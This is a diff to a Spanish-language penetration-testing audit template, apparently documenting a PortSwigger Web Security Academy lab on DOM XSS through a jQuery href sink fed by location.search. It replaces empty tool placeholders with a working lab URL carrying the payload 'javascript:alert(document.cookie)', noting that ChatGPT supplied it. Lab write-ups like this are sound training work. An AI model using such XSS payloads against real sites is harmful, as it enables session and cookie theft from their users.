@@ -6,7 +6,7 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️ </summary>
 
-## AUDITORIA DE: ((RELEVANT))
+## AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor de atributos de anclaje jQuery href usando location.search))
 
 ***
 
@@ -1280,115 +1280,22 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+
+*   [x] CHAT GPT👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    URL CON EL PAYLOAD  (javascript:alert(document.cookie)) QUE FUNCIONO: 
+
+
+    https://0aac007e04fc89f280813502004b0007.web-security-academy.net/feedback? 
+    returnPath=javascript:alert(document.cookie)
     ```
 
-    * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] SEARCHSPLOIT👈 --------------------------------->[https://www.kali.org/tools/exploitdb/](https://www.kali.org/tools/exploitdb/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] EXPLOITDB👈 --------------------------------->[https://www.exploit-db.com/](https://www.exploit-db.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] GITHUB SEARCH👈 --------------------------------->[https://github.com/search](https://github.com/search)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] AWESOMEHACKING👈 --------------------------------->[https://awesomehacking.org/](https://awesomehacking.org/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] NVD VULNERABILITIES BASE👈 --------------------------------->[https://nvd.nist.gov/vuln](https://nvd.nist.gov/vuln)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] MSFVENOM PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/metasploit-framework/ ](https://www.kali.org/tools/metasploit-framework/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/msfvenom-generador-de-payloads)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] MSFPC PAYLOAD👈 --------------------------------->[https://www.kali.org/tools/msfpc/](https://www.kali.org/tools/msfpc/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] RAPID7 vulnerabilidades y exploits👈 --------------------------------->[https://www.rapid7.com/db/](https://www.rapid7.com/db/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] HACKTOOL👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
+    * CONCLUSION: CONSULTANDO A GPT SOBRE UN METODO PARA QUE SE EJECUTE UN ALERT CON LAS DOCUMENT.COOKIES NOS DEVOLVIO ESTE CODIGO SIMPLE EL CUAL FUNCIOINO EN EL BROWSER TAMBIEN.
 
 ***
 
